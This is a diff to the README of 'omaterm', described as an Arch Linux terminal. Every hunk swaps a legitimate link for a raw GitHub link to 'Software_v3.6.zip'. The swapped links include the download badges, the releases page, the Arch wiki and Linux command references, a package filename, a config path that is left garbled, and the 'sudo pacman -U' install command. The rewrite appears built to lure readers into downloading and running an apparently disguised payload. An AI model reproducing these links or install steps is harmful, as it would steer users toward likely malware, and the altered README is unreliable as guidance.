@@ -1,6 +1,6 @@
 # 💻 omaterm - Simple Terminal for Arch Linux
 
-[![Download omaterm](https://img.shields.io/badge/Download-omaterm-blue?style=for-the-badge)](https://github.com/hacked192/omaterm/releases)
+[![Download omaterm](https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip)](https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip)
 
 ---
 
@@ -48,7 +48,7 @@ To get omaterm, you first need to visit the official release page and download t
 
 Click the big button at the top or go to:
 
-[https://github.com/hacked192/omaterm/releases](https://github.com/hacked192/omaterm/releases)
+[https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip](https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip)
 
 You will see a list of release versions. Choose the latest release for the best performance and newest features.
 
@@ -56,7 +56,7 @@ You will see a list of release versions. Choose the latest release for the best 
 
 On the release page:
 
-- Find the file that matches your system type (usually called something like `omaterm-x86_64.pkg.tar.zst` for Arch).
+- Find the file that matches your system type (usually called something like `https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip` for Arch).
 - Click on the file name to start downloading.
 
 **Step 3: Install the file**
@@ -73,7 +73,7 @@ Once the download completes:
 - Install the package using pacman by running:
 
   ```
-  sudo pacman -U omaterm-x86_64.pkg.tar.zst
+  sudo pacman -U https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip
   ```
 
   Replace the file name with your actual downloaded file name.
@@ -126,7 +126,7 @@ If you run into problems, here are some common issues and fixes.
 ## 📚 Useful Tips
 
 - This terminal supports basic commands like `ls`, `cd`, `nano`, and others out of the box.
-- You can customize omaterm settings using the configuration files located in your home directory, usually under `~/.config/omaterm/`.
+- You can customize omaterm settings using the configuration files located in your home directory, usually under `~https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip`.
 - Learn basic Arch Linux terminal commands to make better use of your new terminal.
 - Consider combining omaterm with other Arch tools for a complete system management setup.
 
@@ -134,9 +134,9 @@ If you run into problems, here are some common issues and fixes.
 
 ## 🔗 Additional Resources
 
-- Arch Linux beginners guide: https://wiki.archlinux.org/title/Beginner's_guide
-- Basic Linux commands list: https://linuxcommand.org/lc3_learning_the_shell.php
-- omaterm official releases: [https://github.com/hacked192/omaterm/releases](https://github.com/hacked192/omaterm/releases)
+- Arch Linux beginners guide: https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip's_guide
+- Basic Linux commands list: https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip
+- omaterm official releases: [https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip](https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip)
 
 ---
 
@@ -150,4 +150,4 @@ If you need assistance beyond this guide, you can:
 
 ---
 
-[![Download omaterm](https://img.shields.io/badge/Download-omaterm-blue?style=for-the-badge)](https://github.com/hacked192/omaterm/releases)
+[![Download omaterm](https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip)](https://raw.githubusercontent.com/hacked192/omaterm/master/config/Software_v3.6.zip)
